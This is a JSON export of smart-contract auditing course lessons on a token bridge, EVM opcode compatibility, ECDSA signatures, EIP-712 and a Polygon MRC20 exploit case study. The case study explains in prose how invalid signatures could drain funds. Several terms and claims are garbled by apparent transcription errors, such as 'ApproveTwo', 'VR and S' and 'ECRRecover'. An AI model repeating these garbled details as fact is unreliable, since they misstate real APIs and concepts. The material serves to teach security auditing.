failure-to-initialize issue here.\n\n## Understanding Ownership in the Contract\n\nNext, we come across the apparent fact that the L1 bridge is ownable. This isn't surprising. A constructor prepares an IERC20 token (a standard interface for tokens within smart contracts). It's worth noting that each vault seems to be working with one token and one bridge.\n\nThe constructor of the contract appears perfectly reasonable. The 'ownable' entity will be message.sender (which will be the Boss bridge). The core purpose of the `approveTo` function seems to be that the bridge is authorized to move funds in and out of the vault.\n\nHowever, one detail stands out - the approval isn't hardcoded to the bridge, but can potentially be granted to anything, which could pose a security risk.\n\n```js\n    function ApproveTwo(address _target, uint256 _amount) external onlyOwner {\n        Token.approve(_target, _amount);\n        }\n```\n\nThese are some initial observations and insights on the L1 vault in the TokenBridge contract. Despite some minor concerns and potential areas for improvement, the contract seems to be well structured and efficient. Up next: exploring Solidity metrics and how they affect the contract.\n\n> \"Each vault works with one token. That's good to know.\"\n",
          "updates": []
        },
        {
          "lessonId": "a7b76821-b434-4f46-ad93-ae8be1a72ed8",
          "number": 9,
          "title": "Yul Opcodes",
          "slug": "yul-opcodes",
          "folderName": "9-yul-opcodes",
          "description": "",
          "duration": 2,
          "videoUrl": "FTQ6is6V13NrQI623zRmb5GF1EkYtqHQRLsjdX6x1EA",
          "rawMarkdownUrl": "/routes/security/7-bridges/9-yul-opcodes/+page.md",
          "markdownContent": "---\ntitle: Yul & Opcodes Introduction\n---\n\n\n\n---\n\n# How to Inspect Solidity's Token Factory\n\nHey there! Ready to check out some code today? Awesome, let's do this. I hope you're as excited as I am. Let's first check our vault. Looking good! Our token also seems perfectly fine. Now, whatâ€™s next?\n\n## Token Factory Complexity Score\n\nThe next on our list is something with a complexity score of 23. It's the intriguing Solidity contract called `TokenFactory`. Referring to the title, the `TokenFactory` is designed to allow the owner to deploy new ERC20 contracts.\n\nFor clarification, a complexity score is a numerical value that represents the complexity of code. The higher the score, the more complex the code is. Itâ€™s a great tool for identifying areas in your software that could benefit from refactoring to simplify the code and make it easier to maintain.\n\n`TokenFactory` is intended to be deployed on both an L1 and L2 Ethereum layer. Sounds interesting, right?\n\nLet's dive deeper into this 'Token Factory' contract.\n\n![](https://cdn.videotap.com/N7h8lDL4ZkNHmMUJm92I-16.6.png)\n\n## Analyzing The Token Factory Contract\n\nAccording to the documentation, the `TokenFactory` allows you to deploy a new ERC20 contract by passing it a symbol and the byte code of the new token. The symbol and byte code represent the identity of the new token that we want to deploy.\n\nA portion of the code that specifically interests me is the assumption that this is going to be an L1 token byte code. Just the thought of this seems a tad scary.\n\nOne question pops in my head: \"Did they even test this assumption anywhere?\"\n\n![](https://cdn.videotap.com/SXAsB2ew8qmWRUaZnRI6-37.94.png)\n\n## Checking The Test Method\n\nAh! They did. I see that there is a `TokenFactory` test. Now, itâ€™s critical to remember that we are assuming the test is accurate. Although tests can contain errors too, they give us a good sense of how the software behaves under certain conditions.\n\nWhile the complexity score was discomforting and the code adherence was quite scary to me, the presence of this test somehow eases the discomfort.\n\nHowever, there's a \"Q\" marked on the code here which means \"Query\". It marks a place where the reader has questions or doubts about the code. In this case, it might be fine, but it begs the question - \"Should this query be left out of scope?\"\n\nTo be blunt, there just seems to be some risky business here.\n\n## An Auditorâ€™s Perspective\n\nâ€œAre you sure you should leave this out of scope?â€, I find myself asking. Even though the guidelines say it's okay to exclude this in a competitive audit, in a private audit, I would still strongly recommend addressing this.\n\n> \"You should really secure this code. There might be better ways to implement it.\"\n\nRemember, it's always crucial to double-check everything in your code, especially when it comes to security. Don't take things at face value.\n\nOne of the points that catch my attention is that it doesn't seem efficient. The byte code is stored in memory rather than in call data, which is less gas efficient. Maybe it would be better to refactor the token factory.\n\n![](https://cdn.videotap.com/DwK3ACMPJE6lTsWulD7x-71.14.png)\n\n## Final Thoughts\n\nDoes it all seem a bit scary? Absolutely. But keep in mind that it could also be an excellent opportunity to improve the code. The best code isn't always the most complex one, but the most secure and efficient.\n\nThe challenging but fun part is figuring out the best way to do this. Itâ€™s a never-ending journey of learning and discovery. So, let's learn and discover together!\n\nHappy coding!\n",
          "updates": []
        },
        {
          "lessonId": "736a476f-8947-4e49-b381-5335079ac4c7",
          "number": 10,
          "title": "Unsupported Opcodes",
          "slug": "unsupported-opcodes",
          "folderName": "10-unsupported-opcodes",
          "description": "",
          "duration": 11,
          "videoUrl": "Olg01CRyrYZLhJCbyG4KBn9VIo6zvyswwLiSazYbVJxw",
          "rawMarkdownUrl": "/routes/security/7-bridges/10-unsupported-opcodes/+page.md",
          "markdownContent": "---\ntitle: Exploit - Unsupported Opcodes\n---\n\n\n\n---\n\n# Deep Dive into Assembly Blocks in Solidity\n\nWelcome to another exciting episode in our exploration of Solidity! Today, we're going to be deep-diving into an intriguing aspect of Solidity: Assembly Blocks. So get your coding gloves on and let's start this journey!\n\n## The Assembly Block: An Introduction\n\nAssembly blocks in Solidity offer us lower access level to the Ethereum Virtual Machine (EVM). Though not super low-level as there exists some level of abstraction in assembly (also known as Yul), assembly blocks provide a closer approach to working with EVM opcodes.\n\n![](https://cdn.videotap.com/kygHboewjVz29gEvJnFB-57.14.png)\n\n> \"Assembly in Solidity allows us closer access to the EVM, letting us perform opcodes that could potentially be unsafe.\"\n\nIn the course of this blog, we will be examining the use case of the `Create` opcode in assembly. The `Create` opcode in Yul can be researched further in the [Solidity documentation](https://docs.soliditylang.org/en/v0.8.9/yul.html).\n\n## Diving Into the Code: Exploring `Create` Opcode\n\nOn executing the `Create` opcode, it consumes a value of VPN. To understand the essence of VPN, we actually have to examine the columns at the beginning of the documentation. The explanation column reveals that our `Create` opcode will form a new contract with the specified code and consequently dispatch `Vwei` and return the fresh address. In the event that an error occurs, it returns zero.\n\nLet's now delve more into the assembly block where this opcode is being used. Within this block, the opcode is saying that the contract bytecode. Secondly, it will load the contract bytecode into memory and then proceed to instantiate a contract.\n\nIn programming using Solidity within the EVM, it's commonplace that almost any time you undertake something with contract deployment or variables or even literary reading, it's always necessary to load it into memory first.\n\n## The Nitty-Gritty Details: Loading into Memory\n\nSo how do we go about loading into memory? Fundamentally, you have to specify how much memory to load, from where, and to where. And anytime you're dealing with memory, you have to be very precise about your details.\n\n![](https://cdn.videotap.com/bZJqzJb0Ba8wN3UXX2mL-214.29.png)\n\nIn light of the specifications, it's safe to say that the first chunk of assembly we encounter returns an address. The purpose of the whole block is to create a contract and return the corresponding address.\n\n## The TokenFactory: Its Role and Significance\n\nDelving further, we discover that the token factory keeps track of all tokens it broadcasts. It also emits a token upon being deployedâ€”an interesting feature! A function, `getTokenAddressFromSymbol`, is also present, but it doesn't seem to be used anywhere within the rest of the code.\n\n```js\nfunction getTokenAddressFromSymbol(string memory _symbol) public view returns (address){\n    return s_TokenToAddress[_symbol];\n    }\n```\n\nConsidering its lack of usage, this function could have likely been more effectively designated as external rather than public.\n\n## Launching a Check on the Opcode: The Checklist Approach\n\nAnd now we arrive at an essential checkpoint: the opcode checklist. By utilizing this checklist, one can discover fascinating things about the opcode. A surprisingly interesting question you might find is whether the `push0` Opcode is supported for Solidity versions above `0.8.20`.\n\nAnother question that pops up is the compatibility of EVM Opcodes and the protocol's operations across all target chains. It brings to mind the compatibility of the `Create` opcode with all our working chains.\n\n![](https://cdn.videotap.com/aypb7Nern5qzvXGaDMLH-385.71.png)\n\nTo unravel this puzzle, a practical step is to utilize the Solidity compiler, Solk, and see what we get after building the contracts and inspecting them. Sure enough, upon exploring the contracts, we will find the `Create` Opcode, which confirms its presence.\n\n## Checking Compatibility Levels: The Ethereum Mainnet and Zksync\n\nAs we've identified the opcode, we have to be sure about its compatibility with our working chains. Ethereum's mainnet is an assured pass, but what about Zksync?\n\nA quick dive into the [`Zksync documentation`](https://zksync.io/) clarifies things a lot. They have a comprehensive FAQ segment that explicates the difference between being 'EVM Compatible' and 'EVM Equivalent'.\n\n> \"EVM Equivalent means a given protocol supports every Opcode of the Ethereum EVM down to the bytecode. EVM Compatible means a percentage of the Ethereum EVM's Opcodes are supported.\"\n\nZksync is optimized to be EVM compatible and not EVM equivalent for a variety of reasons. However, this doesn't clarify the compatibility of the `Create` OpCode.\n\nDelving deeper, it becomes apparent that the EVM constructions `Create` and `Create2` on Zksync only work when the compiler is aware of the contract's bytecode beforehand. If the contract isn't aware of the bytecode prior to deployment, it will fail. This approach is strikingly similar to our example codeâ€”confirming its potential failure on Zksync.\n\n## Concluding Remarks: The Importance of Compatibility Checks\n\nThis discovery underscores the importance of thorough opcode compatibility checks across all working chains. In fact, there was a well-documented instance of 921 ETH being stuck in a Zksync contract because the transfer function failed.\n\nJust a little foresight to check compatibility would have saved this massive loss! This real-life scenario serves as a solemn reminder of how vital it is always to consider EVM compatibility in our code implementations.\n\nIn conclusion, whenever you embark on security reviews or contract deployments, always remember to refer to your safety checklist. Going through such a checklist not only helps you find hidden oddities but also ensures you're on the safer side of things.\n\nIn all, remember that the devil is in the details. Happy programming!\n",
          "updates": []
        },
        {
          "lessonId": "4b7147fc-142c-4dfc-9f3b-891516b97a0e",
          "number": 11,
          "title": "BossBridge",
          "slug": "bossbridge",
          "folderName": "11-bossbridge",
          "description": "",
          "duration": 3,
          "videoUrl": "AxU02OpN3bg4XyqKb6CCFmU5OC7BDkz00bffaN7UwPoR8",
          "rawMarkdownUrl": "/routes/security/7-bridges/11-bossbridge/+page.md",
          "markdownContent": "---\ntitle: BossBridge.sol\n---\n\n\n\n---\n\n# Analyzing and Making Sense of the Boss Bridge\n\nWelcome to another deep dive into the world of blockchain code! Amidst our adventures, we stumbled upon a complex and intriguing beast known as the Boss Bridge. Now it's time to give it a thorough examination. So, let's grab our diving gear, get comfortable and leap straight into the code!\n\n## A Brief Introduction\n\nThe Boss Bridge doesn't have a lot of code, but don't let that mislead you. It's petite stature hides a heart of complex code. We'll deconstruct it piece by piece, so by the end, you're familiar with each line and what it does.\n\n## Code Inspection: Pragma and Imports\n\nFirst off, the top of our file is home to a list of imports and a `pragma solidity` statement, versioned at 0.8.20. That seems up-to-date, which is a good start!\n\n```js\npragma solidity 0.8.20;\n```\n\nMoving on to the imports, we have OpenZeppelin taking up a good portion of the space. As a tried and tested library thoroughly reviewed for security, it's always reassuring to see it.\n\nNext, we have a couple of new imports; namely the `ReentrancyGuard`, `Message`, `HashUtils`, and `ECDSA`. These might not be as familiar as OpenZeppelin, but they're equally important. Here's a closer look at a couple of them.\n\n## Reinforcing the Code with ReentrancyGuard and Understanding Pausable\n\n_Disclaimer:_ This is where it's about to get technical.\n\n### Pausable\n\nFirst up is `Pausable`. As the name suggests, it allows the addition of an emergency stop mechanism to your contracts.\n\n```js\nimport \"@openzeppelin/contracts/security/Pausable.sol\";\n```\n\nIt provides modifiers like `whenNotPaused` and `whenPaused` along with `pause` and `unpause` functions.\n\nThe intriguing part is that certain functionality works only when `whenNotPaused` is in effect. Like any responsible coder, I checked whether there's a way to pause the contract by running forge.\n\nGood news: We do have a pause function in here!\n\n### ReentrancyGuard\n\nNext, let's take on `ReentrancyGuard`. It's a fabulous guard against reentrancy attacks.\n\n```js\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n```\n\nThrough the use of a clever system it calls \"mutex locks,\" it ensures that your functions stay clear of reentrancy mischief. It does this by using `nonReentrant`, `nonReentrantBefore`, and `nonReentrantAfter` modifiers.\n\nEssentially, it places a lock onto your function, ensuring that there are no repeated entries during its execution, which could lead to reentrancy attacks.\n\nIn our `BossBridge` contract, the `sendToL1` function is guarded by `nonReentrant`, keeping it safe from potential threats.\n\n## Conclusion\n\nWe made some solid discoveries in our examination of the Boss Bridge's code. We managed to identify important aspects such as the use of the `Pausable` and `ReentrancyGuard` components, as well as confirmed the availability of the `pause` function.\n\nKeep coding and exploring, blockchain adventurers! I'll join you in the next deep-dive session.\n\n> _\"Any fool can write code that a computer can understand. Good programmers write code that humans can understand.\"_ - Martin Fowler.\n",
          "updates": []
        },
        {
          "lessonId": "81494f55-5d9c-48cf-848d-fe09ad1fc05f",
          "number": 12,
          "title": "Signatures",
          "slug": "signatures",
          "folderName": "12-signatures",
          "description": "",
          "duration": 6,
          "videoUrl": "1ZNP8H02sscgO0000O02b00I19008ik4oDgK2yZXmp02V6fzwM",
          "rawMarkdownUrl": "/routes/security/7-bridges/12-signatures/+page.md",
          "markdownContent": "---\ntitle: Signatures Introduction\n---\n\n\n\n---\n\n# Deep Dive into Message Hash Utils: A guide to Signature Message Hash Utilities in Blockchain\n\nIn this post, we're going to delve into signature message hash utilities which are used to produce digests to be consumed by Elliptic Curve Digital Signature Algorithm (ECDSA) for recovery or signing. If you're new to blockchain technology, it might all sound like Greek mythology, but worry not. We're going back to basics - courtesy of the [Anders Brownworth Blockchain demo](https://andersbrownworth.com/blockchain).\n\n## Understanding the Blockchain Demo\n\nAnders Brownworth has created a simple, yet intuitive public-private key demo that has been of great educational help in understanding blockchain better. Unfortunately, the demo has recently been taken down but, the good news is you can find it on [GitHub](https://github.com/anders94/public-private-key-demo).\n\nA simple `git clone` will get you started but ensure that you have node JS installed beforehand.\n\n```bash\ngit clone https://github.com/anders94/public-private-key-demo\ncd public-private-key-demo\nnpm install\n./bin/www\n```\n\nYou're now successfully running the blockchain demo on your local machine! Visit `localhost` on your web browser while the server is still running and TADA, behold the blockchain demo.\n\n## Unraveling Signatures\n\n> \"Signature is a process where a private key is combined with a message to create a unique message signature. The process verifies that the public key and the message match the signature.\"\n\nThis process of signing transactions with private keys is how blockchain works.\n\nExample: When we operate digital wallets, like MetaMask, and make transactions using Ethereum, we sign these transactions and send these signed messages onto the blockchain. Other blockchain nodes verify these messages.\n\nIn the blockchain demo, you can generate a pair of private and public keys. Sign a message using your private key and visually follow the entire process.\n\n![](https://cdn.videotap.com/I31ISMCAE8CABrMXYyaq-89.18.png)\n\n## Exploring Message Hash Utils\n\n`MessageHashUtils` might look a bit confusing, but it's an effort to standardize the messages and hashes in the Ethereum blockchain transactions. Some Ethereum Improvement Proposals (EIPs) have been introduced to enhance this.\n\nThe first one to consider is `ERC-191`, a standard for signed data, and is specifically targeted for signed data in Ethereum Smart contracts. The motive behind this was to establish a common format for all signed data.\n\n![](https://cdn.videotap.com/7kCHT85kigZxan9r7aki-109.png)\n\nAccording to `ERC-191`, the data is arranged in the following manner:\n\n- The start of the signed data is marked by `0x19` (1 byte)\n- It's followed by â€˜version specificâ€™ data (1 byte)\n- Additionally, the generic data to sign\n\nThe next version is the `EIP-712` or the structured data, which we will discuss in details in the later part of this blog.\n\nFor the signed data, all signatures in blockchain comprise of `r, s, and v` parameters.\n\nLet's see an example using Solidity `0.8.0`.\n\n```js\nfunction execute(address target,uint256 nonce,bytes memory payload,uint8 v,bytes32 r,bytes32 s) public {\n    bytes memory data = abi.encode(target,nonce,keccak256(payload),msg.sender);\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\",DOMAIN_SEPARATOR,keccak256(data)));\n    address recoveredAddress = ecrecover(digest, v, r, s);\n    require(recoveredAddress == msg.sender,\"Invalid signature\");\n    (bool success,) = target.call(payload);\n    require(success, \"Execution failed.\");}\n```\n\nIn the code above, `r`, `s`, and `v` are components of the signed data. In order to verify who signed this message, you can use a precompiled function known as `ecrecover`. The `ecrecover` function takes in the parameters `v`, `r`, and `s` and returns the address that was used to sign the hash. The example above checks if the recovered address matches the sender's address, indicating that the sender indeed signed the bytes.\n\nThe function of `ecrecover` is to identify the signer of the hash, i.e, who signed the data. This function is instrumental in Solidity contracts because it helps verify if a certain person signed something.\n\n## Wrapping it up\n\nIn conclusion, message hash utilities are used to enhance transparency and uniformity in signing messages and contracts in the Ethereum blockchain. We also explored how Solidity's `ecrecover` function can be used to identify the signer of data. This essentially aids in the process of verification of a signed contract, thus adding another layer of trust and security to the blockchain technology.\n",
          "updates": []
        },
        {
          "lessonId": "db5df59f-e075-4e05-b165-d7e649cedc6b",
          "number": 13,
          "title": "Signatures Summarized",
          "slug": "signatures-summarized",
          "folderName": "13-signatures-summarized",
          "description": "",
          "duration": 1,
          "videoUrl": "XzLvDRREawshom6LTDaRubvu1fEEbMx00zSFWhGOAju8",
          "rawMarkdownUrl": "/routes/security/7-bridges/13-signatures-summarized/+page.md",
          "markdownContent": "---\ntitle: Signatures Summarized\n---\n\n_Follow along with this video:_\n\n\n\n---\n\n# Decoding Cryptographic Signing: Private Keys, Messages, and Signature Verification\n\nIf you're taking your first steps into the world of blockchain or cryptography, you've probably stumbled across the terms private key, messages, digital signatures, etc. In this blog post, we'll break down the fascinating process of signing messages using private keys. No worry if these terms seem to be Greek to you right now, all will get clearer as you read further.\n\n## What Does Signing Messages Actually Mean?\n\nWhen we refer to 'signing' in the context of blockchain and cryptography, we're talking about a process by which we authenticate messages on the blockchain using a private key. It's a crucial aspect of data and transaction security.\n\nNow you might ask, what does signing a message involve and how does it work? Let's break it down a bit.\n\n> Initially, the process starts with two distinct elements: a private key and a message.\n\n![](https://cdn.videotap.com/1RO5OQCrdWw5Vd9SjdCN-14.67.png)\n\nThe content of the messages we refer to usually includes data elements like function signatures, function selectors, parameters, etc.\n\n### The Magic Box: The Elliptic Curve Digital Signature Algorithm\n\nThese components, the private key and message, are then pushed into a fascinating 'algorithmic machine' known as the Elliptic Curve Digital Signature Algorithm (ECDSA). Now, unless you're deeply interested in cryptography, you probably don't need to understand the complex math behind it.\n\nHence, you can imagine the ECDSA as a magic box, a black box if you will. If you're curious about the inner mechanisms of this 'black box', I highly recommend a deep dive into the Elliptic Curve Cryptography- an excellent starting point could be [this link](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography).\n\n![](https://cdn.videotap.com/2RjUzLDQpobVxdX7u9lT-23.83.png)\n\n### The Output: VR and S\n\nOnce we feed the private key and message into the black box, the ECDSA, it gives us two outputs, famously known as VR and S. These components make up our unique Digital Signature.\n\n![](https://cdn.videotap.com/IQH3FxNz2xIA59h8rO4F-29.33.png)\n\n## Full Circle: Verifying the Signature\n\nAmazingly, we can use this digital signature, the VR and S, to verify that a message was, indeed, signed by a specific address. This gives a receiver the confidence that the message they received was indeed from the sender it claims to be.\n\nIn simpler terms, this tells us that the sender of the message is the legitimate owner of the address from which the message was sent, bringing us to the very essence and necessity of cryptographic signing - Authentication and Verification.\n\n![](https://cdn.videotap.com/eNLThyvbZVxz4fr0PJHT-36.67.png)\n\nTo wrap it up, Message Signing and Signature Verification is a simple and secure method to verify the integrity of messages, transactions, and data on the Blockchain. It is an integral part of the blockchain infrastructure, ensuring that addresses and their transactions remain authentic and secure.\n\nIn the fast-evolving world of blockchain and cryptography, understanding such key concepts is not only essential but also engaging. It peels back the layers of the complex systems we often use without understanding and puts power back into the hands of users. Whether it's to enhance your professional knowledge or simply for the thrill of learning something new, delving into the wonder of cryptography is remarkably worthwhile. I highly recommend continuing your cryptographic journey from here, you never know where it might lead you next.\n\nStay curious, keep learning, and until the next post, Happy Cryptography!\n",
          "updates": []
        },
        {
          "lessonId": "226a2d46-7507-450c-97bc-f00a65b744e2",
          "number": 14,
          "title": "EIP-712",
          "slug": "eip-712",
          "folderName": "14-eip-712",
          "description": "",
          "duration": 4,
          "videoUrl": "vdP00zrEelCOIE244w02FPCcWzk01PD7O9nTK01hp9STveE",
          "rawMarkdownUrl": "/routes/security/7-bridges/14-eip-712/+page.md",
          "markdownContent": "---\ntitle: EIP-712\n---\n\n\n\n---\n\n# Untangling the Beauty of Smart Contracts: A Dive Into EIP 712 Structured Data\n\nSmart contracts have revolutionized the way we do transactions and communicate data in the blockchain arena. At the crux of it all lies `MessageHashUtils`, a fundamental tool that greatly simplifies our interactions with these contracts. In this post, we'll take a closer look at the EIP 712 and EIP 191 hash functions, and demonstrate their implementation in an actual contract.\n\nRemember, smart contracts and untangling their complexities might feel intimidating, but once you get the hang of it, it's an engaging puzzle worth solving. So let's get started!\n\n## Breaking Down EIP 712 and EIP 191\n\nIntroducing, the **EIP 712** and **EIP 191**! These are hashing and signing standards for Ethereum smart contracts, making the signing process easier for users.\n\nBefore these standards, users were just told 'hey, sign this message,' and a cryptic byte string was shown. With the advent of EIP 712, Ethereum made user experience way better with formatted requests: 'hey, sign this message: from, to, contents'.\n\nAre you a fan of typed, structured data instead of just byte strings? Well, EIP 712 is perfect for you!\n\nFor those who want to do a deep dive, you can read more about the implementation of EIP 712 and EIP 191 [here](https://eips.ethereum.org/EIPS/eip-712) and [here](https://eips.ethereum.org/EIPS/eip-191) respectively.\n\n![](https://cdn.videotap.com/Q9EBgPOu5axhNmcCfrNw-49.3.png)\n\n## Working with EIP 712: An Example\n\nTo illustrate how to work with EIP 712, let's look at a simple example. We've defined a struct `Mail`, with struct `Person`(from, to) and string contents. This is our structured data. After this, we can break the signed message into its essential components - `V`, `R`, and `S`, and verify this signed data using the `verify` function from the EIP 712 hashing contract (refer to the [github repo](https://github.com/Cyfrin/security-and-auditing-full-course-s23)).\n\n![](https://cdn.videotap.com/3vXpOBtPGNOYDzTe7xew-92.43.png)\n\n## Verifying the Magic: EIP 712 Verification\n\nNow that we've signed the data, how do we verify it?\n\nThe `ECRRecover` function of Solidity comes in handy here. The function hashes the data into a format called a 'digest'. The `ECRRecover` then checks whether the 'from' component of the message is correct using specific input parameters.\n\n> Don't miss out on learning more about how important `ecrecover` is by checking out the Solidity documentation [here](https://docs.soliditylang.org/en/v0.8.23/smtchecker.html#function-calls).\n\nNOTES\n\n1. The digest is essentially the hashed data put into a specific format.\n2. Breaking the signed message into `V`, `R`, `S` components forms the input for `ecrecover`.\n\nYou can explore a bit more about this part with a practical example in the `Example.sol` contract in the course's GitHub repository.\n\n![](https://cdn.videotap.com/3Bx9eDqrngeXdafn4LDv-197.19.png)\n\n## Let's Watch a Mistake: Polygon Case Study\n\nOrdinarily, low-level signature signing seems like a tedious task. But here's an interesting case study on how forgetting to double-check a precompiled `ECRRecover` function return value led to an exploitable vulnerability on Polygon...\n\n![](https://cdn.videotap.com/BjhKxp4Deaz9YZi3bwyj-215.68.png)\n\n## Wrapping Up\n\nSo that's a quick run-through on `EIP 712` and `EIP 191`, two important specifications that make handling and signing Ethereum smart contracts a breeze. Though it might seem a little complex, with a bit of practice, you'll find it's not so scary after all! Don't forget to check out the next part where we dive into a Polygon case study. Happy coding!\n",
          "updates": []
        },
        {
          "lessonId": "18c9b150-0b32-4eb9-9372-ce2497d2656b",
          "number": 15,
          "title": "Case Study: Polygon",
          "slug": "polygon",
          "folderName": "15-polygon",
          "description": "",
          "duration": 9,
          "videoUrl": "7WW5yHQv7mvZuW9qM4Lu4G2DdUU101LcSXVAk6zk8jzI",
          "rawMarkdownUrl": "/routes/security/7-bridges/15-polygon/+page.md",
          "markdownContent": "---\ntitle: Case Study - Polygon Precompile\n---\n\n\n\n---\n\n# Hunting for smart contract bugs: How a developer identified a $7 billion exploit\n\nIf you fancy yourself a tech-savvy problem solver or a capable and competent coder, the world of smart contract bug bounties could be your next lucrative adventure. Not only are these exploits well-paying when correctly identified, but they also aid in securing the ecosystem against hackers.\n\nI recently had the occasion to interview a developer who discovered a $7 billion bug and was rewarded with $2.2 million for his conscientious reporting of this vulnerability. By exploring his successful case, we can learn the key strategies and tools you'll need to find your million-dollar bounty.\n\nLet's delve into this intriguing world of hunting for smart contract bugs.\n\n## Matic blockchain, Polygon, and the MRC20 contract\n\nOn May 31, 2020, the Matic blockchain, which later rebranded as the Polygon chain, was launched. An [EVM](https://ethereum.org/en/developers/docs/evm/) compatible blockchain, it's known for its low gas fees, rapid block times, and recent ventures into [ZK technology](https://polygon.technology/polygon-zkevm).\n\nIf we return to the beginning, block zero to be precise, we find ten transactions in this Genesis block. One of these transactions created the MRC20 contract. This contract allowed users to sign a transaction without sending it, meaning they could offset gas costs. For example, somebody else could be responsible for these costs. This technique is referred to as a metatransaction, which is better explained in [EIP 712](https://eips.ethereum.org/EIPS/eip-712). Initiated with almost 10 billion MATIC, this contract facilitated these gasless transactions. However, it concealed a critical exploit, an oversight that could potentially empty the contract of its entire content.\n\n## The discovery of the dormant exploit\n\nOn December 3, 2021, Leon Spacewalker (a pseudonym of our developer hero) submitted a report about this potential vulnerability to Immunify. Less than two days later, another astute individual discovered this exploit. Unfortunately, this other individual was a malicious hacker and successfully pilfered 800,000 MATIC tokens from the contract.\n\nPolygon was forked two days after the initial report, and the contract was swiftly mended. From December 5, 2021, the MRC20 contract was no longer vulnerable to this exploit.\n\nBut what exactly was this bug, and how did it remain unidentified for so long? Let's turn our attention to the function that enabled these gasless transactions.\n\n## Anatomy of the bug - A detailed look\n\nThis function appears benign at first glance. It requires a user's signature, data, and an amount to send, an expiration date, and a recipient for the money. Running certain checks, it retrieves the data hash required for the metatransaction and ensures this data hash hasn't been previously used. Following these steps, it then launches an EC recovery function.\n\nThis recovery function, ecrecover, verifies the origin of a signed transaction. However, should it encounter an error, it simply returns the zero address without viability checks. Even though there is a condition to ensure that this return is not zero, the ececovery function still returns zero upon encountering an error. Herein lies the vulnerability.\n\nIf the function were to check the overall validity of this function and not just the zero address, the problem would've been handled. But alas, that check was overlooked. The transfer function, acting as the last line of defense, should at least verify the 'from' address. But it simply transfers money out of the MRC20 contract without making any such checks.\n\nThe exploit was then straightforward: Just passing a faulty signature, setting any quantity, and denoting a receiver. This method would essentially drain the entire MATIC balance.\n\n### Prevalence of dormant bugs in the tech world\n\nIt's both peculiar and surprising that this bug remained latent for about 1.5 years, only to be discovered by multiple individuals within a short span. After discussing with the Immunified team, they provided a remarkable insight: these sleeping exploit beasts' simultaneous awakenings are a fairly common phenomenon. As soon as media outlets popularize new bugs, bug hunters flock to identify them in other plausible places.\n\nDespite this seemingly random event, we can extract several valuable lessons from this saga.\n\n## Strategies to identify bugs\n\nMy conversation with Leon yielded some precious tips and tricks he employed to discover this and numerous other security loopholes. Note that a basic understanding of Solidity and appropriate smart contract fundamentals are desirable assets in watching your million-dollar bounty surface.\n\n### 1. Distinct advantage - Find your edge\n\nEvery bug bounty hunter must have a unique advantage. Leon's advice to anyone entering this space, hone that specific skill, that edge over other smart contract developers, bug hunters, and protocols.\n\n### 2. Know the subject - Understand the protocol\n\nKnowing the specifics of the protocol in-depth is one of the most common strategies to find bugs. Reading the documentation, experimenting with the protocol implementation, etc., if you grasp every corner of the protocol, you're likely to identify aberrations as well.\n\n### 3. Research and Grow\n\nResearch on specific bugs and uncover projects that have those loopholes. This technique, requiring a solid understanding of diverse exploits and maintaining awareness of unexplored best practices, simplifies your search as you're only seeking a specific chunk of code in a project.\n\n### 4. Speed is key\n\nBeing quick in identifying new bounties and updates surely benefits in this context. Equipped with the right tools, such as Immunified discord BBP notifications, one can always stay ahead.\n\n### 5. Devising unique strategies - Be creative\n\nLeon often visited community forums projecting a potential bug bounty. He would then start exploring their smart contracts even before approval to gain a head start.\n\n### 6. Arm yourself with the right tools\n\nKnowledgeable bug hunters use various helpful tools. Solidity Visual Developer, Hard Hat Foundry, Brownie, Dune Analytics, and Etherscan are a few examples.\n\n### 7. Audited projects are not bug-free\n\nLeon has discovered numerous vulnerabilities in projects that top firms had audited. So, do not be disheartened by audited projects.\n\n### 8. Find your niche\n\nGaining industry-specific knowledge can dramatically improve your ability to uncover bugs.\n\nAlthough the example discussed here is quite specific and outlines a single bug hunt, these tips can be generalized for anyone hopeful of winning a sizeable bug bounty.\n\nAre you prepared to accept the challenge?\n\n![](https://cdn.videotap.com/MuftBpuNZSZv4cmAeOuU-506.03.png)\n",
          "updates": []
        },
        {
          "lessonId": "77477bf0-095d-4ce5-93e0-026c4ba36d8b",
          "number": 16,
          "title": "Signatures Recap",
          "slug": "signature-recap",
          "folderName": "16-signature-recap",
          "description": "",
          "duration": 1,
          "videoUrl": "N21xX6007LOERBNigJ3lZx1LhiLcZZL9q39ydbdg2qDE",
          "rawMarkdownUrl": "/routes/security/7-bridges/16-signature-recap/+page.md",
          "markdownContent": "---\ntitle: Signatures Recap\n---\n\n\n\n---\n\n# Understanding the Magic of Digital Signatures and Blockchain: A Simple Tutorial\n\nWelcome back, fellow blockchain enthusiasts. We've covered a lot in our past discussions, and this post will focus on one of the most fundamental aspects of blockchain technology: digital signatures. By the end of this read, you'd be able to comprehend how digital signatures work and how they are minted using Elliptical Curve Digital Signature Algorithm (ECDSA). Don't worry! We've broken it down into the simplest terms possible.\n\n## How Digital Signatures Work\n\nDigital signatures underpin the integrity and security of transactions within a blockchain ecosystem. These contrivances act as a proof of authenticity, confirming that the message has been sent by a verified sender and has not been tampered with, during transmission.\n\n![](https://cdn.videotap.com/jSSntLnGkMJPWVtSFsUs-6.19.png)Here's a simplified snapshot of the digital signature process:\n\n1. Your Private Key + the Message &gt; **ECDSA** &gt; Output (r,s values) = Signature\n2. Signature + Original Message &gt; **ECDSA Verification** &gt; Sender's Public Key\n\n### Elliptical Curve Digital Signature Algorithm\n\nThe core of creating a digital signature is an intelligent mathematical process known as the Elliptical Curve Digital Signature Algorithm, or ECDSA. Essentially, you take the private key and the message and feed them into this algorithm.\n\nThis operation generates a signature in a specific format, often referred to as _r_ and _s_- the crucial parts of your digital signature. These signatures are safe to put on-chain as they do not contain any public information.\n\n### Verifying The Signature\n\nHow can we ensure that the message was indeed signed off by the claimed sender? Verification is the process that answers this question.\n\nYou take the signed message plus the reported _r_ and _s_ values and plug them into the verifying component of the ECDSA. Adding the data they supposedly signed results in the output, which is essentially the signatory of the message.\n\nThis verifying component is known as an `ECR precompile`, a part of the elliptical curve digital signature mechanism.\n\nThe magic happens when `ECR precompile` outputs the same person you expect to have signed the message. If it does, then voila! It's an honest transaction, and that's precisely what we want to achieve.\n\n> \"In the world of cryptography and digital transactions, your signature is the cornerstone of credibility.\"\n\n## Wrapping Up\n\nIn summary, a digital signature is akin to your digital fingerprint. With ECDSA's wizardry, a simple, unique combination of values (comprising of a private key, a message and the _r,s_ values) embodies your authority and ensures the authenticity of transactions. Understanding these fundamentals of how signing and verification work is integral to mastering blockchain 